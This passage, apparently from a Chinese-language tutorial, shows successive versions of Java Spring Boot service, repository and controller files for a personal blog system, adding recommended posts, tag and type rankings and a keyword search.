title&#x3D;&#39;&quot; + title + &#39;\\&#39;&#39; +\n                &quot;, content&#x3D;&#39;&quot; + content + &#39;\\&#39;&#39; +\n                &quot;, firstPicture&#x3D;&#39;&quot; + firstPicture + &#39;\\&#39;&#39; +\n                &quot;, flag&#x3D;&#39;&quot; + flag + &#39;\\&#39;&#39; +\n                &quot;, views&#x3D;&quot; + views +\n                &quot;, appreciation&#x3D;&quot; + appreciation +\n                &quot;, shareStatement&#x3D;&quot; + shareStatement +\n                &quot;, commentabled&#x3D;&quot; + commentabled +\n                &quot;, published&#x3D;&quot; + published +\n                &quot;, recommend&#x3D;&quot; + recommend +\n                &quot;, createTime&#x3D;&quot; + createTime +\n                &quot;, updateTime&#x3D;&quot; + updateTime +\n                &quot;, type&#x3D;&quot; + type +\n                &quot;, tags&#x3D;&quot; + tags +\n                &quot;, user&#x3D;&quot; + user +\n                &quot;, comments&#x3D;&quot; + comments +\n                &quot;, tagIds&#x3D;&#39;&quot; + tagIds + &#39;\\&#39;&#39; +\n                &quot;, description&#x3D;&#39;&quot; + description + &#39;\\&#39;&#39; +\n                &#39;&#125;&#39;;\n    &#125;\n&#125;\n后端细节优化MyBeanUtils.java 修复SQL数据修改后为null工具类(过滤掉数据值为null)\npackage com.cxkj.blog.util;\n\nimport org.springframework.beans.BeanWrapper;\nimport org.springframework.beans.BeanWrapperImpl;\n\nimport java.beans.PropertyDescriptor;\nimport java.util.ArrayList;\nimport java.util.List;\n\n&#x2F;**\n * Created by Arvin on 2021&#x2F;2&#x2F;10.\n *&#x2F;\npublic class MyBeanUtils &#123;\n\n\n    &#x2F;**\n     * 获取所有的属性值为空属性名数组\n     * @param source\n     * @return\n     *&#x2F;\n    public static String[] getNullPropertyNames(Object source) &#123;\n        BeanWrapper beanWrapper &#x3D; new BeanWrapperImpl(source);\n        PropertyDescriptor[] pds &#x3D;  beanWrapper.getPropertyDescriptors();\n        List&lt;String&gt; nullPropertyNames &#x3D; new ArrayList&lt;&gt;();\n        for (PropertyDescriptor pd : pds) &#123;\n            String propertyName &#x3D; pd.getName();\n            if (beanWrapper.getPropertyValue(propertyName) &#x3D;&#x3D; null) &#123;\n                nullPropertyNames.add(propertyName);\n            &#125;\n        &#125;\n        return nullPropertyNames.toArray(new String[nullPropertyNames.size()]);\n    &#125;\n\n&#125;\n前端index优化BlogService.java\npackage com.cxkj.blog.service;\n\nimport com.cxkj.blog.pojo.Blog;\nimport com.cxkj.blog.vo.BlogQuery;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.Pageable;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;8.\n *&#x2F;\n\npublic interface BlogService &#123;\n\n    Blog getBlog(Long id);\n\n    Page&lt;Blog&gt; listBlog(Pageable pageable, BlogQuery blogQuery);\n    \n    Page&lt;Blog&gt; listBlog(Pageable pageable);\n\n    Blog saveBlog(Blog blog);\n\n    Blog updateBlog(Long id,Blog blog);\n\n    void deleteBlog(Long id);\n&#125;\nBlogServiceImpl.java\npackage com.cxkj.blog.service;\n\nimport com.cxkj.blog.NotFoundException;\nimport com.cxkj.blog.dao.BlogRepository;\nimport com.cxkj.blog.pojo.Blog;\nimport com.cxkj.blog.pojo.Type;\nimport com.cxkj.blog.util.MyBeanUtils;\nimport com.cxkj.blog.vo.BlogQuery;\nimport org.springframework.beans.BeanUtils;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.Pageable;\nimport org.springframework.data.jpa.domain.Specification;\nimport org.springframework.stereotype.Service;\nimport org.springframework.transaction.annotation.Transactional;\n\nimport javax.persistence.criteria.CriteriaBuilder;\nimport javax.persistence.criteria.CriteriaQuery;\nimport javax.persistence.criteria.Predicate;\nimport javax.persistence.criteria.Root;\nimport java.util.ArrayList;\nimport java.util.Date;\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;8.\n *&#x2F;\n@Service\npublic class BlogServiceImpl implements BlogService&#123;\n\n    @Autowired\n    private BlogRepository blogRepository;\n\n    @Override\n    public Blog getBlog(Long id) &#123;\n        return blogRepository.findById(id).get();\n    &#125;\n\n    @Override\n    public Page&lt;Blog&gt; listBlog(Pageable pageable, BlogQuery blogQuery) &#123;\n\n        return blogRepository.findAll(new Specification&lt;Blog&gt;() &#123;\n            @Override\n            public Predicate toPredicate(Root&lt;Blog&gt; root, CriteriaQuery&lt;?&gt; criteriaQuery, CriteriaBuilder criteriaBuilder) &#123;\n                List&lt;Predicate&gt; predicateList &#x3D; new ArrayList&lt;&gt;();\n                if (!&quot;&quot;.equals(blogQuery.getTitle()) &amp;&amp; blogQuery.getTitle() !&#x3D; null)&#123;\n                    predicateList.add(criteriaBuilder.like(root.&lt;String&gt;get(&quot;title&quot;),&quot;%&quot;+blogQuery.getTitle()+&quot;%&quot;));\n                &#125;\n                if (blogQuery.getTypeID() !&#x3D; null)&#123;\n                    predicateList.add(criteriaBuilder.equal(root.&lt;Type&gt;get(&quot;type&quot;).get(&quot;id&quot;),blogQuery.getTypeID()));\n                &#125;\n                if (blogQuery.isRecommend())&#123;\n                    predicateList.add(criteriaBuilder.equal(root.&lt;Boolean&gt;get(&quot;recommend&quot;),blogQuery.isRecommend()));\n                &#125;\n                criteriaQuery.where(predicateList.toArray(new Predicate[predicateList.size()]));\n                return null;\n            &#125;\n        &#125;,pageable);\n    &#125;\n\n    @Override\n    public Page&lt;Blog&gt; listBlog(Pageable pageable) &#123;\n        return blogRepository.findAll(pageable);\n    &#125;\n\n    @Transactional\n    @Override\n    public Blog saveBlog(Blog blog) &#123;\n        if (blog.getId() &#x3D;&#x3D; null)&#123;\n            blog.setCreateTime(new Date());\n            blog.setUpdateTime(new Date());\n            blog.setViews(0);\n        &#125;else &#123;\n            blog.setUpdateTime(new Date());\n        &#125;\n        return blogRepository.save(blog);\n    &#125;\n\n    @Transactional\n    @Override\n    public Blog updateBlog(Long id, Blog blog) &#123;\n        Blog b &#x3D; blogRepository.findById(id).get();\n        if (b &#x3D;&#x3D; null)&#123;\n            throw new NotFoundException(&quot;管理员大大,这个博客不存在哦！～(　TロT)σ&quot;);\n        &#125;\n        BeanUtils.copyProperties(blog,b, MyBeanUtils.getNullPropertyNames(blog));\n        b.setUpdateTime(new Date());\n        return blogRepository.save(b);\n    &#125;\n\n    @Transactional\n    @Override\n    public void deleteBlog(Long id) &#123;\n        blogRepository.deleteById(id);\n    &#125;\n&#125;\nIndexController.java\npackage com.cxkj.blog.web;\n\nimport com.cxkj.blog.service.BlogService;\nimport com.cxkj.blog.service.TagService;\nimport com.cxkj.blog.service.TypeService;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.data.domain.Pageable;\nimport org.springframework.data.domain.Sort;\nimport org.springframework.data.web.PageableDefault;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.ui.Model;\nimport org.springframework.web.bind.annotation.GetMapping;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;3.\n *&#x2F;\n@Controller\npublic class IndexController &#123;\n\n    @Autowired\n    private BlogService blogService;\n\n    @Autowired\n    private TypeService typeService;\n\n    @Autowired\n    private TagService tagService;\n\n    @GetMapping(&quot;&#x2F;&quot;)\n    public String index(@PageableDefault(size &#x3D; 10,sort &#x3D; &#123;&quot;updateTime&quot;&#125;,direction &#x3D; Sort.Direction.DESC)Pageable pageable, Model model)&#123;\n        model.addAttribute(&quot;page&quot;,blogService.listBlog(pageable));\n        model.addAttribute(&quot;types&quot;,typeService.listTypeTop(6));\n        model.addAttribute(&quot;tags&quot;,tagService.listTagTop(10));\n        model.addAttribute(&quot;recommendBlogs&quot;,blogService.listRecommendBlogTop(8));\n        return &quot;index&quot;;\n    &#125;\n\n    @GetMapping(&quot;&#x2F;blog&quot;)\n    public String blog()&#123;\n            &#x2F;*String blog &#x3D; null;\n            if (blog &#x3D;&#x3D; null)&#123;\n                throw  new NotFoundException(&quot;博客不存在&quot;);\n            &#125;*&#x2F;\n        return &quot;blog&quot;;\n    &#125;\n\n&#125;\nTypeService.java\npackage com.cxkj.blog.service;\n\nimport com.cxkj.blog.pojo.Type;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.Pageable;\n\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;6.\n *&#x2F;\n\npublic interface TypeService &#123;\n\n    Type saveType(Type type);\n\n    Type getType(Long id);\n\n    Type getTypeByName(String name);\n\n    Page&lt;Type&gt; listType(Pageable pageable);\n\n    List&lt;Type&gt; listType();\n\n    List&lt;Type&gt; listTypeTop(Integer size);\n\n    Type updateType(Long id,Type type);\n\n    void deleteType(Long id);\n&#125;\nTypeServiceImpl.java\npackage com.cxkj.blog.service;\n\nimport com.cxkj.blog.NotFoundException;\nimport com.cxkj.blog.dao.TypeRepository;\nimport com.cxkj.blog.pojo.Type;\nimport org.springframework.beans.BeanUtils;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.PageRequest;\nimport org.springframework.data.domain.Pageable;\nimport org.springframework.data.domain.Sort;\nimport org.springframework.stereotype.Service;\nimport org.springframework.transaction.annotation.Transactional;\n\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;6.\n *&#x2F;\n@Service\npublic class TypeServiceImpl implements TypeService&#123;\n\n    @Autowired\n    private TypeRepository typeRepository;\n\n    @Transactional\n    @Override\n    public Type saveType(Type type) &#123;\n        return typeRepository.save(type);\n    &#125;\n\n    @Transactional\n    @Override\n    public Type getType(Long id) &#123;\n        return typeRepository.findById(id).get();\n    &#125;\n\n    @Override\n    public Type getTypeByName(String name) &#123;\n        return typeRepository.findByName(name);\n    &#125;\n\n    @Transactional\n    @Override\n    public Page&lt;Type&gt; listType(Pageable pageable) &#123;\n        return typeRepository.findAll(pageable);\n    &#125;\n\n    @Override\n    public List&lt;Type&gt; listType() &#123;\n        return typeRepository.findAll();\n    &#125;\n\n    @Override\n    public List&lt;Type&gt; listTypeTop(Integer size) &#123;\n        Sort sort &#x3D; Sort.by(Sort.Direction.DESC,&quot;blogs.size&quot;);\n        Pageable pageable &#x3D; PageRequest.of(0,size,sort);\n        return typeRepository.findTop(pageable);\n    &#125;\n\n    @Transactional\n    @Override\n    public Type updateType(Long id, Type type) &#123;\n        Type t &#x3D; typeRepository.findById(id).get();\n        if (t &#x3D;&#x3D; null)&#123;\n            throw new NotFoundException(&quot;您查找的信息不存在(︶︹︺)&quot;);\n        &#125;\n        BeanUtils.copyProperties(type,t);\n        return typeRepository.save(t);\n    &#125;\n\n    @Transactional\n    @Override\n    public void deleteType(Long id) &#123;\n        typeRepository.deleteById(id);\n    &#125;\n&#125;\nTypeRepository.java\npackage com.cxkj.blog.dao;\n\nimport com.cxkj.blog.pojo.Type;\nimport org.springframework.data.domain.Pageable;\nimport org.springframework.data.jpa.repository.JpaRepository;\nimport org.springframework.data.jpa.repository.Query;\n\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;6.\n *&#x2F;\n\npublic interface TypeRepository extends JpaRepository&lt;Type,Long&gt; &#123;\n\n    Type findByName(String name);\n    \n    @Query(&quot;select t from Type t&quot;)\n    List&lt;Type&gt; findTop(Pageable pageable);\n&#125;\nTagService.java\npackage com.cxkj.blog.service;\n\nimport com.cxkj.blog.pojo.Tag;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.Pageable;\n\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;7.\n *&#x2F;\n\npublic interface TagService &#123;\n\n    Tag saveTag(Tag tag);\n\n    Tag getTag(Long id);\n\n    Tag getTagByName(String name);\n\n    Page&lt;Tag&gt; listTag(Pageable pageable);\n\n    List&lt;Tag&gt; listTag();\n    \n    List&lt;Tag&gt; listTagTop(Integer size);\n\n    List&lt;Tag&gt; listTag(String ids);\n\n    Tag updateTag(Long id,Tag tag);\n\n    void deleteTag(Long id);\n&#125;\nTagServiceImpl.java\npackage com.cxkj.blog.service;\n\n\nimport com.cxkj.blog.NotFoundException;\nimport com.cxkj.blog.dao.TagRepository;\nimport com.cxkj.blog.pojo.Tag;\nimport org.springframework.beans.BeanUtils;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.PageRequest;\nimport org.springframework.data.domain.Pageable;\nimport org.springframework.data.domain.Sort;\nimport org.springframework.stereotype.Service;\nimport org.springframework.transaction.annotation.Transactional;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;7.\n *&#x2F;\n@Service\npublic class TagServiceImpl implements TagService&#123;\n\n    @Autowired\n    private TagRepository tagRepository;\n\n    @Transactional\n    @Override\n    public Tag saveTag(Tag tag) &#123;\n        return tagRepository.save(tag);\n    &#125;\n\n    @Transactional\n    @Override\n    public Tag getTag(Long id) &#123;\n        return tagRepository.findById(id).get();\n    &#125;\n\n    @Transactional\n    @Override\n    public Tag getTagByName(String name) &#123;\n        return tagRepository.findByName(name);\n    &#125;\n\n    @Transactional\n    @Override\n    public Page&lt;Tag&gt; listTag(Pageable pageable) &#123;\n        return tagRepository.findAll(pageable);\n    &#125;\n\n    @Override\n    public List&lt;Tag&gt; listTag() &#123;\n        return tagRepository.findAll();\n    &#125;\n\n    @Override\n    public List&lt;Tag&gt; listTagTop(Integer size) &#123;\n        Sort sort &#x3D;  Sort.by(Sort.Direction.DESC,&quot;blogs.size&quot;);\n        Pageable pageable &#x3D; PageRequest.of (0,size,sort);\n        return tagRepository.findTop(pageable);\n    &#125;\n\n    @Override\n    public List&lt;Tag&gt; listTag(String ids) &#123;  &#x2F;&#x2F;1,2,3\n        return tagRepository.findAllById(convertToList(ids));\n    &#125;\n\n    private List&lt;Long&gt; convertToList(String ids)&#123;\n        List&lt;Long&gt; list &#x3D; new ArrayList&lt;&gt;();\n        if (!&quot;&quot;.equals(ids) &amp;&amp; ids !&#x3D; null)&#123;\n            String[] idarray &#x3D; ids.split(&quot;,&quot;);\n            for (int i&#x3D;0; i&lt;idarray.length; i++)&#123;\n                list.add(new Long(idarray[i]));\n            &#125;\n        &#125;\n        return list;\n    &#125;\n\n    @Transactional\n    @Override\n    public Tag updateTag(Long id, Tag tag) &#123;\n        Tag t &#x3D; tagRepository.findById(id).get();\n        if (t &#x3D;&#x3D; null)&#123;\n            throw new NotFoundException(&quot;您查找的信息不存在(︶︹︺)&quot;);\n        &#125;\n        BeanUtils.copyProperties(tag,t);\n        return tagRepository.save(t);\n    &#125;\n\n    @Transactional\n    @Override\n    public void deleteTag(Long id) &#123;\n        tagRepository.deleteById(id);\n    &#125;\n&#125;\nTagRepository.java\npackage com.cxkj.blog.dao;\n\nimport com.cxkj.blog.pojo.Tag;\nimport org.springframework.data.domain.Pageable;\nimport org.springframework.data.jpa.repository.JpaRepository;\nimport org.springframework.data.jpa.repository.Query;\n\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;7.\n *&#x2F;\n\npublic interface TagRepository extends JpaRepository&lt;Tag,Long&gt; &#123;\n\n    Tag findByName(String name);\n\n    @Query(&quot;select t from Tag t&quot;)\n    List&lt;Tag&gt; findTop(Pageable pageable);\n&#125;\nBlogService.java\npackage com.cxkj.blog.service;\n\nimport com.cxkj.blog.pojo.Blog;\nimport com.cxkj.blog.vo.BlogQuery;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.Pageable;\n\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;8.\n *&#x2F;\n\npublic interface BlogService &#123;\n\n    Blog getBlog(Long id);\n\n    Page&lt;Blog&gt; listBlog(Pageable pageable, BlogQuery blogQuery);\n\n    Page&lt;Blog&gt; listBlog(Pageable pageable);\n\n    List&lt;Blog&gt; listRecommendBlogTop(Integer size);\n\n    Blog saveBlog(Blog blog);\n\n    Blog updateBlog(Long id,Blog blog);\n\n    void deleteBlog(Long id);\n&#125;\nBlogServiceImpl.java\npackage com.cxkj.blog.service;\n\nimport com.cxkj.blog.NotFoundException;\nimport com.cxkj.blog.dao.BlogRepository;\nimport com.cxkj.blog.pojo.Blog;\nimport com.cxkj.blog.pojo.Type;\nimport com.cxkj.blog.util.MyBeanUtils;\nimport com.cxkj.blog.vo.BlogQuery;\nimport org.springframework.beans.BeanUtils;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.PageRequest;\nimport org.springframework.data.domain.Pageable;\nimport org.springframework.data.domain.Sort;\nimport org.springframework.data.jpa.domain.Specification;\nimport org.springframework.stereotype.Service;\nimport org.springframework.transaction.annotation.Transactional;\n\nimport javax.persistence.criteria.CriteriaBuilder;\nimport javax.persistence.criteria.CriteriaQuery;\nimport javax.persistence.criteria.Predicate;\nimport javax.persistence.criteria.Root;\nimport java.util.ArrayList;\nimport java.util.Date;\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;8.\n *&#x2F;\n@Service\npublic class BlogServiceImpl implements BlogService&#123;\n\n    @Autowired\n    private BlogRepository blogRepository;\n\n    @Override\n    public Blog getBlog(Long id) &#123;\n        return blogRepository.findById(id).get();\n    &#125;\n\n    @Override\n    public Page&lt;Blog&gt; listBlog(Pageable pageable, BlogQuery blogQuery) &#123;\n\n        return blogRepository.findAll(new Specification&lt;Blog&gt;() &#123;\n            @Override\n            public Predicate toPredicate(Root&lt;Blog&gt; root, CriteriaQuery&lt;?&gt; criteriaQuery, CriteriaBuilder criteriaBuilder) &#123;\n                List&lt;Predicate&gt; predicateList &#x3D; new ArrayList&lt;&gt;();\n                if (!&quot;&quot;.equals(blogQuery.getTitle()) &amp;&amp; blogQuery.getTitle() !&#x3D; null)&#123;\n                    predicateList.add(criteriaBuilder.like(root.&lt;String&gt;get(&quot;title&quot;),&quot;%&quot;+blogQuery.getTitle()+&quot;%&quot;));\n                &#125;\n                if (blogQuery.getTypeID() !&#x3D; null)&#123;\n                    predicateList.add(criteriaBuilder.equal(root.&lt;Type&gt;get(&quot;type&quot;).get(&quot;id&quot;),blogQuery.getTypeID()));\n                &#125;\n                if (blogQuery.isRecommend())&#123;\n                    predicateList.add(criteriaBuilder.equal(root.&lt;Boolean&gt;get(&quot;recommend&quot;),blogQuery.isRecommend()));\n                &#125;\n                criteriaQuery.where(predicateList.toArray(new Predicate[predicateList.size()]));\n                return null;\n            &#125;\n        &#125;,pageable);\n    &#125;\n\n    @Override\n    public Page&lt;Blog&gt; listBlog(Pageable pageable) &#123;\n        return blogRepository.findAll(pageable);\n    &#125;\n\n    @Override\n    public List&lt;Blog&gt; listRecommendBlogTop(Integer size) &#123;\n        Sort sort &#x3D; Sort.by(Sort.Direction.DESC,&quot;updateTime&quot;);\n        Pageable pageable &#x3D; PageRequest.of(0,size,sort);\n        return blogRepository.findTop(pageable);\n    &#125;\n\n    @Transactional\n    @Override\n    public Blog saveBlog(Blog blog) &#123;\n        if (blog.getId() &#x3D;&#x3D; null)&#123;\n            blog.setCreateTime(new Date());\n            blog.setUpdateTime(new Date());\n            blog.setViews(0);\n        &#125;else &#123;\n            blog.setUpdateTime(new Date());\n        &#125;\n        return blogRepository.save(blog);\n    &#125;\n\n    @Transactional\n    @Override\n    public Blog updateBlog(Long id, Blog blog) &#123;\n        Blog b &#x3D; blogRepository.findById(id).get();\n        if (b &#x3D;&#x3D; null)&#123;\n            throw new NotFoundException(&quot;管理员大大,这个博客不存在哦！～(　TロT)σ&quot;);\n        &#125;\n        BeanUtils.copyProperties(blog,b, MyBeanUtils.getNullPropertyNames(blog));\n        b.setUpdateTime(new Date());\n        return blogRepository.save(b);\n    &#125;\n\n    @Transactional\n    @Override\n    public void deleteBlog(Long id) &#123;\n        blogRepository.deleteById(id);\n    &#125;\n&#125;\nBlogRepository.java\npackage com.cxkj.blog.dao;\n\nimport com.cxkj.blog.pojo.Blog;\nimport org.springframework.data.domain.Pageable;\nimport org.springframework.data.jpa.repository.JpaRepository;\nimport org.springframework.data.jpa.repository.JpaSpecificationExecutor;\nimport org.springframework.data.jpa.repository.Query;\n\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;8.\n *&#x2F;\n\npublic interface BlogRepository extends JpaRepository&lt;Blog,Long&gt;, JpaSpecificationExecutor&lt;Blog&gt; &#123;\n\n    @Query(&quot;select b from Blog b where b.recommend &#x3D; true&quot;)\n    List&lt;Blog&gt; findTop(Pageable pageable);\n&#125;\n全局搜索IndexController.java\npackage com.cxkj.blog.web;\n\nimport com.cxkj.blog.service.BlogService;\nimport com.cxkj.blog.service.TagService;\nimport com.cxkj.blog.service.TypeService;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.data.domain.Pageable;\nimport org.springframework.data.domain.Sort;\nimport org.springframework.data.web.PageableDefault;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.ui.Model;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.PostMapping;\nimport org.springframework.web.bind.annotation.RequestParam;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;3.\n *&#x2F;\n@Controller\npublic class IndexController &#123;\n\n    @Autowired\n    private BlogService blogService;\n\n    @Autowired\n    private TypeService typeService;\n\n    @Autowired\n    private TagService tagService;\n\n    @GetMapping(&quot;&#x2F;&quot;)\n    public String index(@PageableDefault(size &#x3D; 10,sort &#x3D; &#123;&quot;updateTime&quot;&#125;,direction &#x3D; Sort.Direction.DESC)Pageable pageable, Model model)&#123;\n        model.addAttribute(&quot;page&quot;,blogService.listBlog(pageable));\n        model.addAttribute(&quot;types&quot;,typeService.listTypeTop(6));\n        model.addAttribute(&quot;tags&quot;,tagService.listTagTop(10));\n        model.addAttribute(&quot;recommendBlogs&quot;,blogService.listRecommendBlogTop(8));\n        return &quot;index&quot;;\n    &#125;\n\n    @PostMapping(&quot;&#x2F;search&quot;)\n    public String search(@PageableDefault(size &#x3D; 10,sort &#x3D; &#123;&quot;updateTime&quot;&#125;,direction &#x3D; Sort.Direction.DESC)Pageable pageable, @RequestParam String query, Model model)&#123;\n        model.addAttribute(&quot;page&quot;,blogService.listBlog(&quot;%&quot;+query+&quot;%&quot;,pageable));\n        model.addAttribute(&quot;query&quot;,query);\n        return &quot;search&quot;;\n    &#125;\n\n    @GetMapping(&quot;&#x2F;blog&#x2F;&#123;id&#125;&quot;)\n    public String blog()&#123;\n            &#x2F;*String blog &#x3D; null;\n            if (blog &#x3D;&#x3D; null)&#123;\n                throw  new NotFoundException(&quot;博客不存在&quot;);\n            &#125;*&#x2F;\n        return &quot;blog&quot;;\n    &#125;\n\n&#125;\nBlogService.java\npackage com.cxkj.blog.service;\n\nimport com.cxkj.blog.pojo.Blog;\nimport com.cxkj.blog.vo.BlogQuery;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.Pageable;\n\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;8.\n *&#x2F;\n\npublic interface BlogService &#123;\n\n    Blog getBlog(Long id);\n\n    Page&lt;Blog&gt; listBlog(Pageable pageable, BlogQuery blogQuery);\n\n    Page&lt;Blog&gt; listBlog(Pageable pageable);\n\n    Page&lt;Blog&gt; listBlog(String query,Pageable pageable);\n\n    List&lt;Blog&gt; listRecommendBlogTop(Integer size);\n\n    Blog saveBlog(Blog blog);\n\n    Blog updateBlog(Long id,Blog blog);\n\n    void deleteBlog(Long id);\n&#125;\nBlogServiceImpl.java\npackage com.cxkj.blog.service;\n\nimport com.cxkj.blog.NotFoundException;\nimport com.cxkj.blog.dao.BlogRepository;\nimport com.cxkj.blog.pojo.Blog;\nimport com.cxkj.blog.pojo.Type;\nimport com.cxkj.blog.util.MyBeanUtils;\nimport com.cxkj.blog.vo.BlogQuery;\nimport org.springframework.beans.BeanUtils;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.PageRequest;\nimport org.springframework.data.domain.Pageable;\nimport org.springframework.data.domain.Sort;\nimport org.springframework.data.jpa.domain.Specification;\nimport org.springframework.stereotype.Service;\nimport org.springframework.transaction.annotation.Transactional;\n\nimport javax.persistence.criteria.CriteriaBuilder;\nimport javax.persistence.criteria.CriteriaQuery;\nimport javax.persistence.criteria.Predicate;\nimport javax.persistence.criteria.Root;\nimport java.util.ArrayList;\nimport java.util.Date;\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;8.\n *&#x2F;\n@Service\npublic class BlogServiceImpl implements BlogService&#123;\n\n    @Autowired\n    private BlogRepository blogRepository;\n\n    @Override\n    public Blog getBlog(Long id) &#123;\n        return blogRepository.findById(id).get();\n    &#125;\n\n    @Override\n    public Page&lt;Blog&gt; listBlog(Pageable pageable, BlogQuery blogQuery) &#123;\n\n        return blogRepository.findAll(new Specification&lt;Blog&gt;() &#123;\n            @Override\n            public Predicate toPredicate(Root&lt;Blog&gt; root, CriteriaQuery&lt;?&gt; criteriaQuery, CriteriaBuilder criteriaBuilder) &#123;\n                List&lt;Predicate&gt; predicateList &#x3D; new ArrayList&lt;&gt;();\n                if (!&quot;&quot;.equals(blogQuery.getTitle()) &amp;&amp; blogQuery.getTitle() !&#x3D; null)&#123;\n                    predicateList.add(criteriaBuilder.like(root.&lt;String&gt;get(&quot;title&quot;),&quot;%&quot;+blogQuery.getTitle()+&quot;%&quot;));\n                &#125;\n                if (blogQuery.getTypeID() !&#x3D; null)&#123;\n                    predicateList.add(criteriaBuilder.equal(root.&lt;Type&gt;get(&quot;type&quot;).get(&quot;id&quot;),blogQuery.getTypeID()));\n                &#125;\n                if (blogQuery.isRecommend())&#123;\n                    predicateList.add(criteriaBuilder.equal(root.&lt;Boolean&gt;get(&quot;recommend&quot;),blogQuery.isRecommend()));\n                &#125;\n                criteriaQuery.where(predicateList.toArray(new Predicate[predicateList.size()]));\n                return null;\n            &#125;\n        &#125;,pageable);\n    &#125;\n\n    @Override\n    public Page&lt;Blog&gt; listBlog(Pageable pageable) &#123;\n        return blogRepository.findAll(pageable);\n    &#125;\n\n    @Override\n    public Page&lt;Blog&gt; listBlog(String query, Pageable pageable) &#123;\n        return blogRepository.findByQuery(query,pageable);\n    &#125;\n\n    @Override\n    public List&lt;Blog&gt; listRecommendBlogTop(Integer size) &#123;\n        Sort sort &#x3D; Sort.by(Sort.Direction.DESC,&quot;updateTime&quot;);\n        Pageable pageable &#x3D; PageRequest.of(0,size,sort);\n        return blogRepository.findTop(pageable);\n    &#125;\n\n    @Transactional\n    @Override\n    public Blog saveBlog(Blog blog) &#123;\n        if (blog.getId() &#x3D;&#x3D; null)&#123;\n            blog.setCreateTime(new Date());\n            blog.setUpdateTime(new Date());\n            blog.setViews(0);\n        &#125;else &#123;\n            blog.setUpdateTime(new Date());\n        &#125;\n        return blogRepository.save(blog);\n    &#125;\n\n    @Transactional\n    @Override\n    public Blog updateBlog(Long id, Blog blog) &#123;\n        Blog b &#x3D; blogRepository.findById(id).get();\n        if (b &#x3D;&#x3D; null)&#123;\n            throw new NotFoundException(&quot;管理员大大,这个博客不存在哦！～(　TロT)σ&quot;);\n        &#125;\n        BeanUtils.copyProperties(blog,b, MyBeanUtils.getNullPropertyNames(blog));\n        b.setUpdateTime(new Date());\n        return blogRepository.save(b);\n    &#125;\n\n    @Transactional\n    @Override\n    public void deleteBlog(Long id) &#123;\n        blogRepository.deleteById(id);\n    &#125;\n&#125;\nBlogRepository.java\npackage com.cxkj.blog.dao;\n\nimport com.cxkj.blog.pojo.Blog;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.Pageable;\nimport org.springframework.data.jpa.repository.JpaRepository;\nimport org.springframework.data.jpa.repository.JpaSpecificationExecutor;\nimport org.springframework.data.jpa.repository.Query;\n\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;8.\n *&#x2F;\n\npublic interface BlogRepository extends JpaRepository&lt;Blog,Long&gt;, JpaSpecificationExecutor&lt;Blog&gt; &#123;\n\n    @Query(&quot;select b from Blog b where b.recommend &#x3D; true&quot;)\n    List&lt;Blog&gt; findTop(Pageable pageable);\n\n    &#x2F;&#x2F;select * from t_blog where title like &#39;%内容%&#39;\n    @Query(&quot;select b from Blog b where b.title like ?1 or b.content like ?1&quot;)\n    Page&lt;Blog&gt; findByQuery(String query,Pageable pageable);\n&#125;\n博客详情业务处理IndexController.java\npackage com.cxkj.blog.web;\n\nimport com.cxkj.blog.service.BlogService;\nimport com.cxkj.blog.service.TagService;\nimport com.cxkj.blog.service.TypeService;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.data.domain.Pageable;\nimport org.springframework.data.domain.Sort;\nimport org.springframework.data.web.PageableDefault;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.ui.Model;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.PathVariable;\nimport org.springframework.web.bind.annotation.PostMapping;\nimport org.springframework.web.bind.annotation.RequestParam;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;3.\n *&#x2F;\n@Controller\npublic class IndexController &#123;\n\n    @Autowired\n    private BlogService blogService;\n\n    @Autowired\n    private TypeService typeService;\n\n    @Autowired\n    private TagService tagService;\n\n    @GetMapping(&quot;&#x2F;&quot;)\n    public String index(@PageableDefault(size &#x3D; 10,sort &#x3D; &#123;&quot;updateTime&quot;&#125;,direction 